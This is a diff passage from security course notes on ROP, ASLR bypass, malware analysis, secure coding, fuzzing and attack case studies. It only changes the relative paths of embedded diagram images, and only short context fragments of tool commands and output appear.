-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-sticky.svg" alt="Sticky Note: 4.2 Return-Oriented Programming (ROP)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/4-2-return-oriented-programming-rop-sticky.svg" alt="Sticky Note: 4.2 Return-Oriented Programming (ROP)" width="30%">
 </a>
 
 
@@ -1115,14 +1115,14 @@ ROPgadget --binary vuln --json > gadgets.json
 
 ### 4.3 ASLR Bypass
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-handwritten.svg" alt="Handwritten: 4.3 ASLR Bypass" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-handwritten.svg" alt="Handwritten: 4.3 ASLR Bypass" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-diagram.svg" alt="Diagram: 4.3 ASLR Bypass" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-diagram.svg" alt="Diagram: 4.3 ASLR Bypass" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-sticky.svg" alt="Sticky Note: 4.3 ASLR Bypass" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/4-3-aslr-bypass-sticky.svg" alt="Sticky Note: 4.3 ASLR Bypass" width="30%">
 </a>
 
 
@@ -1198,14 +1198,14 @@ p.interactive()
 
 ### 5.1 Malware Classification
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-handwritten.svg" alt="Handwritten: 5.1 Malware Classification" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-handwritten.svg" alt="Handwritten: 5.1 Malware Classification" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-diagram.svg" alt="Diagram: 5.1 Malware Classification" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-diagram.svg" alt="Diagram: 5.1 Malware Classification" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-sticky.svg" alt="Sticky Note: 5.1 Malware Classification" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-1-malware-classification-sticky.svg" alt="Sticky Note: 5.1 Malware Classification" width="30%">
 </a>
 
 
@@ -1341,14 +1341,14 @@ p.interactive()
 
 ### 5.2 Malware Types Comparison Table
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-handwritten.svg" alt="Handwritten: 5.2 Malware Types Comparison Table" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-handwritten.svg" alt="Handwritten: 5.2 Malware Types Comparison Table" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-diagram.svg" alt="Diagram: 5.2 Malware Types Comparison Table" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-diagram.svg" alt="Diagram: 5.2 Malware Types Comparison Table" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-sticky.svg" alt="Sticky Note: 5.2 Malware Types Comparison Table" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-2-malware-types-comparison-table-sticky.svg" alt="Sticky Note: 5.2 Malware Types Comparison Table" width="30%">
 </a>
 
 
@@ -1367,14 +1367,14 @@ p.interactive()
 
 ### 5.3 Practical Malware Analysis with ClamAV
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-handwritten.svg" alt="Handwritten: 5.3 Practical Malware Analysis with ClamAV" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-handwritten.svg" alt="Handwritten: 5.3 Practical Malware Analysis with ClamAV" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-diagram.svg" alt="Diagram: 5.3 Practical Malware Analysis with ClamAV" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-diagram.svg" alt="Diagram: 5.3 Practical Malware Analysis with ClamAV" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-sticky.svg" alt="Sticky Note: 5.3 Practical Malware Analysis with ClamAV" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-3-practical-malware-analysis-with-clamav-sticky.svg" alt="Sticky Note: 5.3 Practical Malware Analysis with ClamAV" width="30%">
 </a>
 
 
@@ -1414,14 +1414,14 @@ End Date:   2024:01:15 14:30:55
 
 ### 5.4 Practical: PEStudio and HashDiff Analysis
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-handwritten.svg" alt="Handwritten: 5.4 Practical: PEStudio and HashDiff Analysis" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-handwritten.svg" alt="Handwritten: 5.4 Practical: PEStudio and HashDiff Analysis" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-diagram.svg" alt="Diagram: 5.4 Practical: PEStudio and HashDiff Analysis" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-diagram.svg" alt="Diagram: 5.4 Practical: PEStudio and HashDiff Analysis" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-sticky.svg" alt="Sticky Note: 5.4 Practical: PEStudio and HashDiff Analysis" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/5-4-practical-pestudio-and-hashdiff-analysis-sticky.svg" alt="Sticky Note: 5.4 Practical: PEStudio and HashDiff Analysis" width="30%">
 </a>
 
 
@@ -1457,14 +1457,14 @@ Get-ChildItem -Path . -Recurse -File | Get-FileHash -Algorithm MD5 | Group-Objec
 
 ### 6.1 SSDLC Phases
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-handwritten.svg" alt="Handwritten: 6.1 SSDLC Phases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-handwritten.svg" alt="Handwritten: 6.1 SSDLC Phases" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-diagram.svg" alt="Diagram: 6.1 SSDLC Phases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-diagram.svg" alt="Diagram: 6.1 SSDLC Phases" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-sticky.svg" alt="Sticky Note: 6.1 SSDLC Phases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/6-1-ssdlc-phases-sticky.svg" alt="Sticky Note: 6.1 SSDLC Phases" width="30%">
 </a>
 
 
@@ -1574,14 +1574,14 @@ See Section 6.2 for language-specific guidelines.
 
 ### 6.2 Secure Coding Practices (C/C++/Java/JS)
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-handwritten.svg" alt="Handwritten: 6.2 Secure Coding Practices (C/C++/Java/JS)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-handwritten.svg" alt="Handwritten: 6.2 Secure Coding Practices (C/C++/Java/JS)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-diagram.svg" alt="Diagram: 6.2 Secure Coding Practices (C/C++/Java/JS)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-diagram.svg" alt="Diagram: 6.2 Secure Coding Practices (C/C++/Java/JS)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-sticky.svg" alt="Sticky Note: 6.2 Secure Coding Practices (C/C++/Java/JS)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/6-2-secure-coding-practices-c-c-java-js-sticky.svg" alt="Sticky Note: 6.2 Secure Coding Practices (C/C++/Java/JS)" width="30%">
 </a>
 
 
@@ -1660,14 +1660,14 @@ execFile('grep', [userInput, '/var/log/app.log'], { shell: false }, (err, stdout
 
 ### 7.1 Fuzzing Concepts
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-handwritten.svg" alt="Handwritten: 7.1 Fuzzing Concepts" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-handwritten.svg" alt="Handwritten: 7.1 Fuzzing Concepts" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-diagram.svg" alt="Diagram: 7.1 Fuzzing Concepts" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-diagram.svg" alt="Diagram: 7.1 Fuzzing Concepts" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-sticky.svg" alt="Sticky Note: 7.1 Fuzzing Concepts" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/7-1-fuzzing-concepts-sticky.svg" alt="Sticky Note: 7.1 Fuzzing Concepts" width="30%">
 </a>
 
 
@@ -1688,14 +1688,14 @@ execFile('grep', [userInput, '/var/log/app.log'], { shell: false }, (err, stdout
 
 ### 7.2 Practical: AFL (American Fuzzy Lop)
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-handwritten.svg" alt="Handwritten: 7.2 Practical: AFL (American Fuzzy Lop)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-handwritten.svg" alt="Handwritten: 7.2 Practical: AFL (American Fuzzy Lop)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-diagram.svg" alt="Diagram: 7.2 Practical: AFL (American Fuzzy Lop)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-diagram.svg" alt="Diagram: 7.2 Practical: AFL (American Fuzzy Lop)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-sticky.svg" alt="Sticky Note: 7.2 Practical: AFL (American Fuzzy Lop)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/7-2-practical-afl-american-fuzzy-lop-sticky.svg" alt="Sticky Note: 7.2 Practical: AFL (American Fuzzy Lop)" width="30%">
 </a>
 
 
@@ -1780,14 +1780,14 @@ eip            0x51515151       0x51515151
 
 ### 8.1 Static Analysis (SAST)
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-handwritten.svg" alt="Handwritten: 8.1 Static Analysis (SAST)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-handwritten.svg" alt="Handwritten: 8.1 Static Analysis (SAST)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-diagram.svg" alt="Diagram: 8.1 Static Analysis (SAST)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-diagram.svg" alt="Diagram: 8.1 Static Analysis (SAST)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-sticky.svg" alt="Sticky Note: 8.1 Static Analysis (SAST)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/8-1-static-analysis-sast-sticky.svg" alt="Sticky Note: 8.1 Static Analysis (SAST)" width="30%">
 </a>
 
 
@@ -1865,14 +1865,14 @@ vuln.c:9: Medium: fixed length local buffer
 
 ### 8.2 Dynamic Analysis (DAST)
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-handwritten.svg" alt="Handwritten: 8.2 Dynamic Analysis (DAST)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-handwritten.svg" alt="Handwritten: 8.2 Dynamic Analysis (DAST)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-diagram.svg" alt="Diagram: 8.2 Dynamic Analysis (DAST)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-diagram.svg" alt="Diagram: 8.2 Dynamic Analysis (DAST)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-sticky.svg" alt="Sticky Note: 8.2 Dynamic Analysis (DAST)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/8-2-dynamic-analysis-dast-sticky.svg" alt="Sticky Note: 8.2 Dynamic Analysis (DAST)" width="30%">
 </a>
 
 
@@ -1908,14 +1908,14 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 
 ### 8.3 Static vs Dynamic Analysis Comparison
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-handwritten.svg" alt="Handwritten: 8.3 Static vs Dynamic Analysis Comparison" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-handwritten.svg" alt="Handwritten: 8.3 Static vs Dynamic Analysis Comparison" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-diagram.svg" alt="Diagram: 8.3 Static vs Dynamic Analysis Comparison" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-diagram.svg" alt="Diagram: 8.3 Static vs Dynamic Analysis Comparison" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-sticky.svg" alt="Sticky Note: 8.3 Static vs Dynamic Analysis Comparison" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/8-3-static-vs-dynamic-analysis-comparison-sticky.svg" alt="Sticky Note: 8.3 Static vs Dynamic Analysis Comparison" width="30%">
 </a>
 
 
@@ -1940,14 +1940,14 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 
 ### 9.1 SolarWinds (2020) → Supply Chain Attack
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-handwritten.svg" alt="Handwritten: 9.1 SolarWinds (2020) → Supply Chain Attack" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-handwritten.svg" alt="Handwritten: 9.1 SolarWinds (2020) → Supply Chain Attack" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-diagram.svg" alt="Diagram: 9.1 SolarWinds (2020) → Supply Chain Attack" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-diagram.svg" alt="Diagram: 9.1 SolarWinds (2020) → Supply Chain Attack" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-sticky.svg" alt="Sticky Note: 9.1 SolarWinds (2020) → Supply Chain Attack" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-1-solarwinds-2020-supply-chain-attack-sticky.svg" alt="Sticky Note: 9.1 SolarWinds (2020) → Supply Chain Attack" width="30%">
 </a>
 
 
@@ -2004,14 +2004,14 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 
 ### 9.2 NotPetya (2017) → Ransomware/Wiper
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-handwritten.svg" alt="Handwritten: 9.2 NotPetya (2017) → Ransomware/Wiper" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-handwritten.svg" alt="Handwritten: 9.2 NotPetya (2017) → Ransomware/Wiper" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-diagram.svg" alt="Diagram: 9.2 NotPetya (2017) → Ransomware/Wiper" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-diagram.svg" alt="Diagram: 9.2 NotPetya (2017) → Ransomware/Wiper" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-sticky.svg" alt="Sticky Note: 9.2 NotPetya (2017) → Ransomware/Wiper" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/9-2-notpetya-2017-ransomware-wiper-sticky.svg" alt="Sticky Note: 9.2 NotPetya (2017) → Ransomware/Wiper" width="30%">
 </a>
 
 
@@ -2072,14 +2072,14 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 
 ### 9.3 Stuxnet (2010) → From a Code Perspective
 
